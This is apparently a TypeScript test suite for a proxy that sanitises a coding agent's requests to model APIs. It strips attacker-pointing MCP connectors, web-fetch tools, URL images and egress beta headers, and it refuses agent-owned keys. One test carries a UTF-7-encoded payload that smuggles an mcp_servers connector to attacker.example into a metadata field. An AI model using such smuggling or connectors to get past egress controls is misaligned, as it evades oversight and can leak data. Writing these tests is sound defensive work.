  function expectSanitizedUpstream(path: string): void {
    const forwarded = requests().at(-1);
    expect(forwarded?.path).toBe(path);
    expect(forwarded?.body).toEqual({
      model: hostileRequest.model,
      max_tokens: 1024,
      tools: [{ name: 'Bash', input_schema: { type: 'object' } }],
      messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_9', content: [PLACEHOLDER] }] }],
    });
    expect(forwarded?.rawBody).not.toContain('attacker.example');
    expect(forwarded?.headers['anthropic-beta']).toBe('claude-code-20250219');
  }

  it('api.anthropic.com: removes mcp_servers, container, web_fetch, a URL image in tool_result and egress betas', async () => {
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(anthropicProvider);
    const response = await post('api.anthropic.com', '/v1/messages', hostileRequest, {
      'x-api-key': FAKE_KEY,
      'anthropic-beta': hostileBetas,
    });
    expect(response.statusCode).toBe(200);
    expectSanitizedUpstream('/v1/messages');
    expect(requests()[0].headers['x-api-key']).toBe(REAL_KEY);

    const log = readFileSync(logFilePath, 'utf-8');
    expect(log).toContain(
      'anthropic-messages sanitizer removed: anthropic-beta:mcp-client-2025-04-04, anthropic-beta:web-fetch-2025-09-10, ' +
        'mcp_servers, container, tool:web_fetch_20250910, image:source:url',
    );
  });

  it('api.anthropic.com: sanitizes count_tokens too', async () => {
    await startProxy(anthropicProvider);
    const response = await post('api.anthropic.com', '/v1/messages/count_tokens', hostileRequest, {
      'x-api-key': FAKE_KEY,
      'anthropic-beta': hostileBetas,
    });
    expect(response.statusCode).toBe(200);
    expectSanitizedUpstream('/v1/messages/count_tokens');
  });

  it.each([
    ['an agent-supplied key', { 'x-api-key': 'sk-ant-api03-agent-owned-key' }],
    ['an OAuth bearer that is not the sentinel', { authorization: 'Bearer sk-ant-oat01-agent-owned' }],
    ['no credential', {}],
  ])(
    'answers requests carrying %s with a local 401 and never contacts the upstream',
    async (_label, credential: Record<string, string>) => {
      await startProxy(anthropicProvider);
      const response = await post('api.anthropic.com', '/v1/messages', hostileRequest, {
        ...credential,
        'anthropic-beta': hostileBetas,
      });
      expect(response.statusCode).toBe(401);
      const error = JSON.parse(response.body) as { type: string; error: { type: string; message: string } };
      expect(error.error.type).toBe('authentication_error');
      expect(error.error.message).toMatch(/^IronCurtain proxy refused this request: /);
      expect(requests()).toHaveLength(0);
    },
  );

  it.each([
    ['malformed JSON', '{"model":"claude-sonnet-4-5","mcp_servers":[{"url":"https://attacker.example"}]'],
    ['an empty body', ''],
    ['a non-string model', JSON.stringify({ model: ['claude'], messages: [] })],
    ['a JSON array body', JSON.stringify([hostileRequest])],
  ])('answers %s with a local 400 and never contacts the upstream', async (_label, raw) => {
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(anthropicProvider);
    const response = await post('api.anthropic.com', '/v1/messages', raw, { 'x-api-key': FAKE_KEY });
    expect(response.statusCode).toBe(400);
    expect(response.headers['content-type']).toBe('application/json');
    const error = JSON.parse(response.body) as { type: string; error: { type: string; message: string } };
    expect(error.type).toBe('error');
    expect(error.error.type).toBe('invalid_request_error');
    expect(error.error.message).toMatch(/^IronCurtain proxy refused this request: /);
    expect(requests()).toHaveLength(0);
    expect(readFileSync(logFilePath, 'utf-8')).toContain('[mitm-proxy] REJECTED POST api.anthropic.com/v1/messages');
  });

  it('forwards the canonical body as application/json, never under an agent-chosen charset', async () => {
    // UTF-7 for `"},"mcp_servers":[{"type":"url","url":"https://attacker.example/sse","name":"x"}],"x":{"y":"`.
    // As UTF-8 JSON it is an inert metadata string the sanitizer accepts; an
    // upstream honoring `charset=utf-7` (e.g. Express body-parser) would decode
    // a top-level mcp_servers connector out of the same bytes.
    const smuggled =
      '+ACIAfQ-,+ACI-mcp+AF8-servers+ACI-:+AFsAewAi-type+ACI-:+ACI-url+ACI-,+ACI-url+ACI-:+ACI-https://attacker.example/sse' +
      '+ACI-,+ACI-name+ACI-:+ACI-x+ACIAfQBd-,+ACI-x+ACI-:+AHsAIg-y+ACI-:+ACI-';
    const body = JSON.stringify({
      model: 'claude-sonnet-4-5',
      max_tokens: 16,
      messages: [{ role: 'user', content: 'hi' }],
      metadata: { user_id: smuggled },
    });
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(anthropicProvider);
    const response = await post('api.anthropic.com', '/v1/messages', body, {
      'x-api-key': FAKE_KEY,
      'content-type': 'application/json; charset=utf-7',
    });
    expect(response.statusCode).toBe(200);
    const forwarded = requests()[0];
    expect(forwarded.headers['content-type']).toBe('application/json');
    expect(forwarded.rawBody).toBe(body);
    expect(readFileSync(logFilePath, 'utf-8')).toContain(
      'anthropic-messages sanitizer removed: content-type:application/json; charset=utf-7',
    );
  });

  it('answers a count_tokens body in a coding it cannot decode with 415 instead of forwarding uninspected bytes', async () => {
    await startProxy(anthropicProvider);
    const response = await post('api.anthropic.com', '/v1/messages/count_tokens', 'compressed-bytes', {
      'x-api-key': FAKE_KEY,
      'content-encoding': 'compress',
    });
    expect(response.statusCode).toBe(415);
    expect(requests()).toHaveLength(0);
  });

  it('decodes a gzip-compressed count_tokens body, sanitizes it and forwards it uncompressed', async () => {
    await startProxy(anthropicProvider);
    const compressed = gzipSync(Buffer.from(JSON.stringify(hostileRequest)));
    const response = await post('api.anthropic.com', '/v1/messages/count_tokens', compressed, {
      'x-api-key': FAKE_KEY,
      'anthropic-beta': hostileBetas,
      'content-encoding': 'gzip',
    });
    expect(response.statusCode).toBe(200);
    expectSanitizedUpstream('/v1/messages/count_tokens');
    expect(requests()[0].headers['content-encoding']).toBeUndefined();
  });

  it('answers corrupt gzip data with 400 and never contacts the upstream', async () => {
    await startProxy(anthropicProvider);
    const response = await post('api.anthropic.com', '/v1/messages', 'compressed-bytes', {
      'x-api-key': FAKE_KEY,
      'content-encoding': 'gzip',
    });
    expect(response.statusCode).toBe(400);
    expect(requests()).toHaveLength(0);
  });

  it("forwards Claude Code's ordinary request byte-for-byte, betas included", async () => {
    await startProxy(anthropicOAuthProvider);
    const response = await post('api.anthropic.com', '/v1/messages?beta=true', CLAUDE_CODE_REQUEST, {
      authorization: `Bearer ${FAKE_KEY}`,
      'anthropic-beta': CLAUDE_CODE_BETAS,
      'anthropic-version': '2023-06-01',
    });
    expect(response.statusCode).toBe(200);
    const forwarded = requests()[0];
    expect(forwarded.rawBody).toBe(CLAUDE_CODE_REQUEST);
    expect(forwarded.headers['anthropic-beta']).toBe(CLAUDE_CODE_BETAS);
    expect(forwarded.headers.authorization).toBe(`Bearer ${REAL_KEY}`);
  });

  it('Z.AI messages: sanitizes the completion and count_tokens routes', async () => {
    await startProxy(makeZaiProvider(zaiProfile, 'claude-code'));
    const headers = { authorization: `Bearer ${FAKE_KEY}`, 'anthropic-beta': hostileBetas };
    for (const path of ['/api/anthropic/v1/messages', '/api/anthropic/v1/messages/count_tokens']) {
      const response = await post('api.z.ai', path, hostileRequest, headers);
      expect(response.statusCode).toBe(200);
      expectSanitizedUpstream(path);
    }
  });

  it('OpenRouter messages: maps the model, then sanitizes; count_tokens is sanitized without mapping', async () => {
    await startProxy(makeGatewayProvider(openRouterProfile, 'messages', 'claude-code'));
    const headers = { authorization: `Bearer ${FAKE_KEY}`, 'anthropic-beta': hostileBetas };

    expect((await post('openrouter.ai', '/api/v1/messages', hostileRequest, headers)).statusCode).toBe(200);
    const completion = requests()[0];
    expect(completion.body.model).toBe('z-ai/glm-5.2');
    expect(completion.body).not.toHaveProperty('mcp_servers');
    expect(completion.body).not.toHaveProperty('container');
    expect(completion.body.tools).toEqual([{ name: 'Bash', input_schema: { type: 'object' } }]);
    expect(completion.rawBody).not.toContain('attacker.example');
    expect(completion.headers['anthropic-beta']).toBe('claude-code-20250219');

    expect((await post('openrouter.ai', '/api/v1/messages/count_tokens', hostileRequest, headers)).statusCode).toBe(
      200,
    );
    expectSanitizedUpstream('/api/v1/messages/count_tokens');
  });

  it('OpenRouter messages: a request without a string model is refused before the upstream', async () => {
    await startProxy(makeGatewayProvider(openRouterProfile, 'messages', 'claude-code'));
    const response = await post(
      'openrouter.ai',
      '/api/v1/messages',
      { messages: [{ role: 'user', content: 'hi' }] },
      { authorization: `Bearer ${FAKE_KEY}` },
    );
    expect(response.statusCode).toBe(400);
    expect(requests()).toHaveLength(0);
  });
});
